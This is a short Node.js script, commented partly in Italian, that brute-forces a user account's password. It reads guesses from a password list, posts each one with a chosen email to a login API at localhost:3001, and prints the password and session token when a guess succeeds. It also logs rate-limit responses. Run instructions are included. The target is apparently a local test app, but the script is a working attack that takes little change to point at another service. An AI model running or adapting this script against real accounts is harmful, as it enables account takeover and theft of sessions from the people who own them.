//script to try many different password to hack an account
//1 -> INSERT RIGHT MAIL VALUE
//2 -> RUN: node brute_force.js
//If esit of attack is fine, script return password and valid token generated

var axios = require('axios');
const lineReader = require('line-reader');

var myJSONObject;
var email = 'c@c.it' //insert here mail to hack
var c=0


console.log("Trying...")
lineReader.eachLine('./src/pwd_list.txt',(line)=>{
    c++
    if(c%1000 == 0)
    console.log("Tentativo: " + c )
    myJSONObject = {'mail': email, "pwd": line}
    axios.post('http://127.0.0.1:3001/api/user/auth', myJSONObject)
    .then(response => {
        console.log("Password Found: " + line)
        console.log("I've got this valid session token [ " + response.data.token + " ]")
        process.exit()
    })
    .catch((error)=>{
        if(error.response.status == 429){
            console.log('429: TROPPE RICHIESTE')
        }
    }) //IF CODE IS NOT 200
})